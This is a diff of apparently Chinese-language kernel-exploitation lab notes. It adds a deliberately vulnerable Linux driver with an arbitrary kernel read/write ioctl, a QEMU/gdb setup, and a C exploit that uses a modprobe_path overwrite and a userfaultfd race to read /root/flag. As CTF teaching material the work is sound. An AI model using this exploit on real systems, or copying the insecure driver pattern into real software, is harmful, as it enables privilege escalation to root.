@@ -628,23 +628,90 @@ make clean	#清除编译
 
   **驱动源代码**样例如下所示
   ```c
+#include <linux/init.h>
+#include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/stddef.h>
+#include <linux/fs.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+#include <linux/miscdevice.h>
+#include <linux/ioctl.h>
+#include <linux/random.h>
 
-static int __init
-hawk_init(void) {
-	printk("----------------------------------begin---------------------------------------\n");
+#define VULN_WRITE		0x1737
+#define VULN_READ		0x1738
+
+
+static int vuln_open(struct inode *inode, struct file *filp);
+static long vuln_unlocked_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);
+
+
+static struct file_operations vuln_fops = {
+	open : vuln_open,
+	unlocked_ioctl : vuln_unlocked_ioctl,
+};
+
+
+static struct miscdevice vuln_miscdev = {
+    .minor      = 11,
+    .name       = "vuln",
+    .fops       = &vuln_fops,
+    .mode	    = 0666,
+};
+
+static int vuln_open(struct inode *inode, struct file *filp){
 	return 0;
 }
 
-static void __exit
-hawk_exit(void) {
-	printk("----------------------------------end---------------------------------------\n");
+typedef struct {
+	long long *addr;
+	long long val;
+} Data;
+
+static long vuln_unlocked_ioctl(struct file *filp, unsigned int cmd, unsigned long arg){
+
+	Data data;
+	memset(&data, 0, sizeof(data));
+
+    switch (cmd){
+
+		case VULN_WRITE:
+
+			if(copy_from_user(&data, (Data *)arg, sizeof(data)) != 0)
+				return -ENOMEM;
+
+			*(data.addr) = data.val;
+			break;
+		
+		case VULN_READ:
+
+			if(copy_from_user(&data, (Data *)arg, sizeof(data)) != 0)
+				return -ENOMEM;
+
+			if(copy_to_user((void*)data.val, data.addr, sizeof(data.val)) != 0)
+				return -ENOMEM;
+			break;
+
+		default:
+			return -ENOTTY;
+	}	
+
+    return 0;
 }
 
-module_init(hawk_init);
-module_exit(hawk_exit);
+
+static int vuln_init(void){
+	return misc_register(&vuln_miscdev);
+}
+
+static void vuln_exit(void){
+	 misc_deregister(&vuln_miscdev);
+}
+
+module_init(vuln_init);
+module_exit(vuln_exit);
 MODULE_LICENSE("GPL");
+
 ```
 
 
@@ -748,7 +815,7 @@ KERNEL=$(pwd)/bzImage
 EXP=$(pwd)/exp.c
 
 # 静态编译exp
-gcc -o $(pwd)/rootfs/exp -Wall -static ${EXP}
+gcc -o $(pwd)/rootfs/exp -Wall -Werror -static ${EXP}
 
 # 生成文件系统映像
 (cd ${ROOT}; find . | cpio -o --format=newc > ${ROOTFS})
@@ -771,18 +838,44 @@ qemu-system-x86_64 \
 ### gdb配置文件
 ```
 # .gdbinit
+target remote localhost:1234
 
 # 设置kernel基址
-set $base=0xffffffff81000000
+set $kernel_base=0xffffffff81000000
+set $driver_base=0xffffffffc0000000
 
-target remote localhost:1234
+add-symbol-file kernel/vmlinux $kernel_base
+add-symbol-file driver/vuln.ko $driver_base
+
 ```
 
 ### exp
 
 ```c
+#define _GNU_SOURCE
 #include <stdio.h>
+#include <stdint.h>
 #include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <linux/userfaultfd.h>
+#include <unistd.h>
+#include <sys/syscall.h> 
+#include <sys/mman.h>
+#include <pthread.h>
+#include <errno.h>
+#include <poll.h>
+
+/* Global variables
+ * 定义使用到的全局变量
+ * 使用 gXXX 统一命名，避免与局部变量命名冲突
+ */
+int gfd1, gfd2, gfd3, gfd4;
+void *gaddr1, *gaddr2, *gaddr3, *gaddr4;
+uint64_t glen1, glen2, glen3, glen4;
+
 
 /* Macros
  * 定义辅助宏
@@ -795,13 +888,9 @@ target remote localhost:1234
                __LINE__, #cond); \
         perror(#cond); \
         fflush(stdout); \
-        exit(1); \
+        exit(EXIT_FAILURE); \
     } \
 }
-
-/* Global variables
- * 定义使用到的全局变量
- */
 
 
 
@@ -814,36 +903,217 @@ target remote localhost:1234
  */
 void modprobe_exp()
 {
-    printf("[*] set fake modprobe content\n");
+    printf("[modprobe_exp] set fake modprobe content\n");
     fflush(stdout);
     system("echo '#!/bin/sh' > /tmp/a");
     system("echo 'cp /root/flag /tmp/flag' >> /tmp/a");
     system("echo 'chmod 777 /tmp/flag' >> /tmp/a");
 
 
-    printf("[*] set fake modprobe permission\n");
+    printf("[modprobe_exp] set fake modprobe permission\n");
     fflush(stdout);
     system("chmod +x /tmp/a");
 
 
-    printf("[*] set unknown file content\n");
+    printf("[modprobe_exp] set unknown file content\n");
     fflush(stdout);
     system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
 
 
-    printf("[*] set unknown file permission\n");
+    printf("[modprobe_exp] set unknown file permission\n");
     fflush(stdout);
     system("chmod +x /tmp/dummy");
 
 
-    printf("[*] run unknown file\n");
+    printf("[modprobe_exp] run unknown file\n");
     fflush(stdout);
     system("/tmp/dummy");
 
 
-    printf("[*] read the flag\n");
+    printf("[modprobe_exp] read the flag\n");
     fflush(stdout);
     system("cat /tmp/flag");
+}
+
+/* userfaultfd条件竞争
+ * 条件:
+ *      1. userfaultfd机制被启用
+ *      2. userfaultfd保护机制被关闭，即
+ * /proc/sys/vm/unprivileged_userfaultfd 被设置为1
+ *
+ * 参数:
+ *      1. @addr是通过mmap(NULL, len, PROT_READ | PROT_WRITE,
+                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
+ * 申请的，此时内核仅仅分配了页表，并未分配物理页进行映射
+ *      2. @len为通过mmap申请@addr时，传入的@len值
+ *      3. @thread为自定义的进程 handler，其用于与内核进行交互，从而触发
+ * page fault
+ *      3. @handler为自定义的userfaultfd handler，其会在内核进程触发
+ * page fault时，在userfaultfd_handler中被调用。其接受@page为参数，@page页
+ * 内容在调用完@handler后，被用于初始化分配给内核进程的页
+ *
+ * 参考: https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/
+ */
+struct uffd_arg {
+    int uffd;                       /* 在userfaultfd_exp()中的uffd局部变量 */
+    void *(*handler)(void *page);   /* 在userfaultfd_handler()中，执行的用户自定义
+                                     * handler, 其中参数@page内容将在userfaultfd_handler()
+                                     * 中，被用于初始化触发page fault的页 */
+    int pg_size;                    /* 即页的大小 */
+};
+
+static void * userfaultfd_handler(void *arg)
+{
+    struct uffd_msg msg;
+    char *page = NULL;
+    struct uffdio_copy uffdio_copy;
+    struct uffd_arg *uffd_arg = arg;
+
+    printf("[userfaultfd_handler] create the page\n");
+    if(page == NULL)
+        assert((page = mmap(NULL, uffd_arg->pg_size, PROT_READ | PROT_WRITE,
+                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0))
+                != MAP_FAILED);
+
+    for (;;) {
+
+        struct pollfd pollfd;
+
+        printf("[userfaultfd_handler] wait for event\n");
+        pollfd.fd = uffd_arg->uffd;
+        pollfd.events = POLLIN;
+        assert(poll(&pollfd, 1, -1) != -1);
+
+        printf("[userfaultfd_handler] read the event\n");
+        assert(read(uffd_arg->uffd, &msg, sizeof(msg)) != 0);
+        assert(msg.event == UFFD_EVENT_PAGEFAULT);
+
+        printf("[userfaultfd_handler] execute user-defined handler\n");
+        (*uffd_arg->handler)(page);
+
+        printf("[userfaultfd_handler] handle page fault\n");
+        uffdio_copy.src = (unsigned long) page;
+        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
+                          ~(uffd_arg->pg_size - 1);
+        uffdio_copy.len = uffd_arg->pg_size;
+        uffdio_copy.mode = 0;
+        uffdio_copy.copy = 0;
+        assert(ioctl(uffd_arg->uffd, UFFDIO_COPY, &uffdio_copy) != -1);
+    }
+
+    return NULL;
+}
+
+void userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
+                     void *(*handler)(void *page))
+{
+    int uffd;
+    struct uffdio_api uffdio_api;
+    struct uffdio_register uffdio_register;
+    struct uffd_arg* uffd_arg;
+    const int PG_SIZE = sysconf(_SC_PAGE_SIZE);
+    pthread_t thr;
+
+
+    printf("[userfaultfd_exp] create userfaultfd object\n");
+    assert((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) != -1);
+
+
+    printf("[userfaultfd_exp] set the userfaultfd api\n");
+    uffdio_api.api = UFFD_API;
+    uffdio_api.features = 0;
+    assert(ioctl(uffd, UFFDIO_API, &uffdio_api) != -1);
+
+    printf("[userfaultfd_exp] register the memory range\n");
+    uffdio_register.range.start = (unsigned long) addr;
+    uffdio_register.range.len = (len + PG_SIZE - 1) / PG_SIZE * PG_SIZE;
+    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+    assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);
+
+    printf("[userfaultfd_exp] create the thread to handle userfaultfd events\n");
+    assert((uffd_arg = malloc(sizeof(uffd_arg))) != NULL);
+    uffd_arg->uffd = uffd;
+    uffd_arg->handler = handler;
+    uffd_arg->pg_size = PG_SIZE;
+    assert(pthread_create(&thr, NULL, userfaultfd_handler, uffd_arg) != -1);
+
+    printf("[userfaultfd_exp] create the thread to trigger the page fault\n");
+    assert(pthread_create(&thr, NULL, thread, NULL) != -1);
+}
+
+
+/* 本次exp的符号定义
+ */
+
+#define VULN_WRITE		0x1737
+#define VULN_READ		0x1738
+
+long long *modprobe_path = (long long*) 0xffffffff82851480;
+long long fake_modprobe_path = 0x612f706d742f;
+
+typedef struct {
+	long long *addr;
+	long long val;
+} Data;
+
+void *uf_handler(void *page)
+{
+    Data *data = (Data *)page;
+    data->addr = modprobe_path;
+    data->val = fake_modprobe_path;
+    return NULL;
+}
+
+void *uf_thread(void *arg)
+{
+    assert(ioctl(gfd1, VULN_WRITE, gaddr1) == 0);
+    return NULL;
+}
+
+int main(void)
+{
+
+    /* 尝试使用modprobe进行提权
+     */
+    //int fd;
+    //Data data;
+
+    //assert((fd = open("/dev/vuln", O_RDWR)) >= 0);
+
+    //data.addr = modprobe_path;
+    //data.val = fake_modprobe_path;
+
+    //assert(ioctl(fd, VULN_WRITE, &data) == 0);
+    //modprobe_exp();
+
+
+
+
+    /* 尝试使用userfaultfd扩大条件竞争
+     */
+    //Data data;
+    //long long buf;
+    //uint64_t len;
+
+    //len = 0x1000;
+    //assert((gfd1 = open("/dev/vuln", O_RDWR)) >= 0);
+
+    //// 注册userfaultfd，并通过ur_thr触发page fault
+    //assert((gaddr1 = mmap(NULL, len, PROT_READ | PROT_WRITE,
+    //                    MAP_PRIVATE | MAP_ANONYMOUS, -1 ,0))
+    //       != MAP_FAILED);
+    //userfaultfd_exp(gaddr1, len, uf_thread, uf_handler);
+
+    //// 此时page fault还未处理完，条件竞争读取modprobe_path值
+    //data.addr = modprobe_path;
+    //data.val = (long long)&buf;
+    //assert(ioctl(gfd1, VULN_READ, &data) == 0);
+    //assert(buf != fake_modprobe_path);
+
+    //// 等待uf_thr终止
+    //sleep(2);
+    //modprobe_exp();
+    return 0;
 }
 
 ```
